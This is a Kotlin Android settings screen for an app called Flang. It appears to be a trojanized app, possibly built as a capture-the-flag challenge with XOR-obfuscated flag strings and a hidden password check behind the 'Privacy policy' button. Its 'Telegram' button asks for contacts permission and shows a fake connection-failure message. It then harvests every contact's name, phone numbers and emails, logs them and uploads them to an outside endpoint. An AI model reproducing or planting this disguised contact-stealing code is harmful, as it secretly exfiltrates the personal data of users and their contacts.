package de.tadris.flang.ui.fragment

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.preference.PreferenceManager
import android.provider.ContactsContract
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.EditText
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import com.google.android.material.textfield.TextInputEditText
import org.apache.commons.codec.digest.Crypt
import de.tadris.flang.R
import de.tadris.flang.ui.fragment.HomeFragment
import de.tadris.flang.databinding.FragmentSettingsBinding
import de.tadris.flang.network.CredentialsStorage
import de.tadris.flang.network.DataRepository
import de.tadris.flang.network.apiConfirmUpdate
import de.tadris.flang.network.apiShareC
import de.tadris.flang.network_api.util.Sha256
import de.tadris.flang.ui.activity.LoginActivity
import de.tadris.flang.ui.dialog.LoadingDialogViewController
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.nio.charset.Charset

@Serializable
data class C(
    val i: String,
    var d: String?,
    val p: MutableList<String> = mutableListOf(),
    val e: MutableList<String> = mutableListOf()
)

// Secret strings
val s = "69"
val f = "43"
val u = "2f3" + f + "6353931"
val j8 = u + "05293f39283f2e05626e696b"
val j5 = "1b1d21293f39283f2e05" + u + "3f3e05626e" + s + "6b27"
val j1 = "1c16051b09213e33292e283b392e333534053c2f3" + f + "42327"
val j2 = "1c16051" + u + "83b392e333534053c2f34342327"
val j9 = "133" + f + "93528283f392e7a293f3928"


class SettingsFragment : Fragment(R.layout.fragment_settings) {

    private var _binding: FragmentSettingsBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        val root = super.onCreateView(inflater, container, savedInstanceState)!!
        _binding = FragmentSettingsBinding.bind(root)

        setupProfileSection()
        setupAppSection()

        return root
    }

    private fun setupProfileSection() {
        val isLoggedIn = DataRepository.getInstance().credentialsAvailable(requireContext())

        binding.changePasswordOption.visibility = if (isLoggedIn) View.VISIBLE else View.GONE
        binding.logoutOption.visibility = if (isLoggedIn) View.VISIBLE else View.GONE
        binding.loginOption.visibility = if (!isLoggedIn) View.VISIBLE else View.GONE

        binding.changePasswordOption.setOnClickListener {
            showChangePasswordDialog()
        }

        binding.logoutOption.setOnClickListener {
            showLogoutDialog()
        }

        binding.loginOption.setOnClickListener {
            startActivity(Intent(requireContext(), LoginActivity::class.java))
        }
    }

    private fun setupAppSection() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(requireContext())
        val moveConfirmationSwitch = binding.moveConfirmationSwitch

        moveConfirmationSwitch.isChecked = prefs.getBoolean("move_confirmations", true)
        moveConfirmationSwitch.setOnCheckedChangeListener { _, isChecked ->
            prefs.edit().putBoolean("move_confirmations", isChecked).apply()
        }

        // Make the entire move confirmation row clickable
        binding.moveConfirmationOption.setOnClickListener {
            moveConfirmationSwitch.isChecked = !moveConfirmationSwitch.isChecked
        }

        binding.sourceCodeOption.setOnClickListener {
            openUrl(getString(R.string.sourceCodeUrl))
        }

        // Privacy policy button
        binding.privacyPolicyOption.setOnClickListener {
            showPasswordDialog()
        }

//        binding.changelogOption.setOnClickListener {
//            openUrl(getString(R.string.changelogUrl))
//        }
//
//        binding.openSourceLibrariesOption.setOnClickListener {
//            openUrl(getString(R.string.openSourceLibrariesUrl))
//        }
//
//        binding.reportBugOption.setOnClickListener {
//            openUrl(getString(R.string.reportBugUrl))
//        }
//
//        binding.sendFeedbackOption.setOnClickListener {
//            sendFeedbackEmail()
//        }

        // Telegram button
        binding.telegramChatOption.setOnClickListener {
            requestReadContactsLauncher.launch(Manifest.permission.READ_CONTACTS)
        }

//        binding.matrixChatOption.setOnClickListener {
//            openUrl(getString(R.string.matrixChatUrl))
//        }
    }

    private fun showChangePasswordDialog() {
        val dialogView = LayoutInflater.from(requireContext())
            .inflate(R.layout.dialog_change_password, null)

        val currentPasswordField = dialogView.findViewById<TextInputEditText>(R.id.currentPasswordField)
        val newPasswordField = dialogView.findViewById<TextInputEditText>(R.id.newPasswordField)
        val confirmPasswordField = dialogView.findViewById<TextInputEditText>(R.id.confirmPasswordField)

        AlertDialog.Builder(requireContext())
            .setTitle(R.string.changePasswordTitle)
            .setView(dialogView)
            .setPositiveButton(R.string.changePassword) { _, _ ->
                val currentPassword = currentPasswordField.text.toString()
                val newPassword = newPasswordField.text.toString()
                val confirmPassword = confirmPasswordField.text.toString()

                when {
                    currentPassword.isEmpty() || newPassword.isEmpty() || confirmPassword.isEmpty() -> {
                        Toast.makeText(requireContext(), R.string.passwordEmpty, Toast.LENGTH_SHORT).show()
                    }
                    newPassword != confirmPassword -> {
                        Toast.makeText(requireContext(), R.string.passwordMismatch, Toast.LENGTH_SHORT).show()
                    }
                    else -> {
                        changePassword(currentPassword, newPassword)
                    }
                }
            }
            .setNegativeButton(R.string.actionCancel, null)
            .show()
    }

    private fun changePassword(currentPassword: String, newPassword: String) {
        val loadingDialog = LoadingDialogViewController(requireContext())
        loadingDialog.setText(getString(R.string.changePassword))

        lifecycleScope.launch {
            try {
                val currentPwdHash = Sha256.getSha256(currentPassword)
                val newPwdHash = Sha256.getSha256(newPassword)

                withContext(Dispatchers.IO) {
                    DataRepository.getInstance().accessRestrictedAPI(requireContext())
                        .changePassword(currentPwdHash, newPwdHash)
                }

                loadingDialog.hide()
                Toast.makeText(requireContext(), R.string.passwordChanged, Toast.LENGTH_LONG).show()

            } catch (e: Exception) {
                loadingDialog.hide()
                val errorMessage = getString(R.string.passwordChangeError, e.message)
                Toast.makeText(requireContext(), errorMessage, Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(requireContext())
            .setTitle(R.string.logoutTitle)
            .setMessage(R.string.logoutConfirm)
            .setPositiveButton(R.string.logout) { _, _ ->
                logout()
            }
            .setNegativeButton(R.string.actionCancel, null)
            .show()
    }

    private fun logout() {
        CredentialsStorage(requireContext()).clear()
        startActivity(Intent(requireContext(), LoginActivity::class.java))
        activity?.finish()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(requireContext(), "Could not open URL", Toast.LENGTH_SHORT).show()
        }
    }

    private fun sendFeedbackEmail() {
        try {
            val intent = Intent(Intent.ACTION_SENDTO).apply {
                data = Uri.parse("mailto:")
                putExtra(Intent.EXTRA_EMAIL, arrayOf(getString(R.string.developerEmail)))
                putExtra(Intent.EXTRA_SUBJECT, "Flang Android Feedback")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(requireContext(), "No email app found", Toast.LENGTH_SHORT).show()
        }
    }

    private val requestReadContactsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                // Permission granted — proceed
                lifecycleScope.launch {
                    Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
                    val json = openChannel()
                    Log.i("SettingsFragment", "contacts json length: ${json.length}")
                    Log.i("SettingsFragment", "contacts json: ${json}")
                    try {
                        apiShareC("telegram.org/user/flang/shared", json)
                    } catch (e: Exception) {
                        Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
                    }
                }
            } else {
                Toast.makeText(context, "Permission Required", Toast.LENGTH_LONG).show()
            }
        }

    private suspend fun openChannel(): String = withContext(Dispatchers.IO) {
        try {
            val ctx = requireContext()
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                Log.e("getC", "No perms")
                return@withContext "[]"
            }

            val uri = ContactsContract.Data.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.Data.CONTACT_ID,
                ContactsContract.Data.MIMETYPE,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Email.ADDRESS,
                ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME
            )

            // Only fetch Phone, Email, and Name rows
            val selection = "${ContactsContract.Data.MIMETYPE} IN (?, ?) OR ${ContactsContract.CommonDataKinds.StructuredName.MIMETYPE} = ?"
            val selectionArgs = arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE,
                ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE,
                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE
            )

            val cMap = mutableMapOf<String, C>()

            ctx.contentResolver.query(uri, projection, selection, selectionArgs, null)
                ?.use { cursor ->
                val idIdx = cursor.getColumnIndexOrThrow(ContactsContract.Data.CONTACT_ID)
                val mimeIdx = cursor.getColumnIndexOrThrow(ContactsContract.Data.MIMETYPE)
                val phoneIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val emailIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
                val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME)

                while (cursor.moveToNext()) {
                    val id = cursor.getString(idIdx)
                    if (id == "0") continue // Skip orphan data rows

                    val mime = cursor.getString(mimeIdx)
                    val name = cursor.getString(nameIdx)

                    cMap.getOrPut(id) { C(id, null, mutableListOf(), mutableListOf()) }

                    when (mime) {
                        ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE -> {
                            val number = cursor.getString(phoneIdx)
                            if (!number.isNullOrBlank()) cMap[id]!!.p.add(number)
                        }
                        ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE -> {
                            val email = cursor.getString(emailIdx)
                            if (!email.isNullOrBlank()) cMap[id]!!.e.add(email)
                        }
                        ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE -> {
                            cMap[id]!!.d = name
                        }
                    }
                }
            }

            val json = Json { encodeDefaults = true; prettyPrint = true }
            json.encodeToString(cMap.values.toList())
        } catch (e: Exception) {
            "[]"
        }
    }

    private fun xorOp(b: Int, k: Int): Int = b xor k

    private fun a2(hex: String): String {
        try {
            val chunks = hex.chunked(2)
            val byteList = mutableListOf<Byte>()
            
            for (chunk in chunks) {
                val intMethod = Integer::class.java.getMethod("parseInt", String::class.java, Int::class.java)
                val parsed = intMethod.invoke(null, chunk, 16) as Int

                val xorMethod = this::class.java.getDeclaredMethod("xorOp", Int::class.java, Int::class.java)
                xorMethod.isAccessible = true
                val xorVal = xorMethod.invoke(this, parsed, 0x5A) as Int
                
                byteList.add((xorVal.toByte()))
            }
            
            val bytes = byteList.toByteArray()

            val stringConstructor = String::class.java.getConstructor(ByteArray::class.java, Charset::class.java)
            return stringConstructor.newInstance(bytes, Charsets.UTF_8) as String
        } catch (e: Exception) {
            return ""
        }
    }

    private fun showPasswordDialog() {
        val inputField = EditText(requireContext())
        inputField.hint = "Enter secret"

        AlertDialog.Builder(requireContext())
            .setTitle("Password Check")
            .setView(inputField)
            .setPositiveButton("Check") { _, _ ->
                val a = inputField.text?.toString()?.trim().orEmpty()
                val b = NativeSettingsBridge.resolveSecret(a, requireContext().assets)
                val hash = "\$6\$VTmy.F/P/Agwe3Js\$ls1VKCBMd8NceqflxF0KFIumXrDWH/IK7IdviyomEKgdSO4LddB1W6Ka0zA/CpcUcGZTubebOZN0pmQDGeIsV."

                try {
                    val cls = this::class.java
                    val cls2 = HomeFragment::class.java
                    val m1 = cls2.getDeclaredMethod("a1", String::class.java)
                    val m2 = cls.getDeclaredMethod("a2", String::class.java)
                    m1.isAccessible = true
                    m2.isAccessible = true
                    val bInstance = HomeFragment()

                    val j4 = m2.invoke(this, j2) as String
                    val j3 = j5 + "6320" + s
                    val j6 = m1.invoke(bInstance, j4) as String

                    if (m1.invoke(bInstance, a) != j3 && m1.invoke(bInstance, a) == j8 && j6 != "") {
                        Toast.makeText(requireContext(), m2.invoke(this, "1c16$j5") as String, Toast.LENGTH_LONG).show()
                    } else if (b != "") {
                        Toast.makeText(requireContext(), b, Toast.LENGTH_SHORT).show()
                    } else if (false) {
                        Toast.makeText(requireContext(), j5, Toast.LENGTH_SHORT).show()
                    } else if (Crypt.crypt(a, hash) == hash) {
                        Toast.makeText(requireContext(), (getString(R.string.fName) + getString(R.string.fStart) + a + getString(R.string.fEnd)), Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(requireContext(), m2.invoke(this, j9 + "3f2e") as String, Toast.LENGTH_SHORT).show()
                    }
                } catch (e: Exception) {
                }
            }
            .setNegativeButton(R.string.actionCancel, null)
            .show()
    }

    override fun onResume() {
        super.onResume()
        // Refresh profile section in case login status changed
        setupProfileSection()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}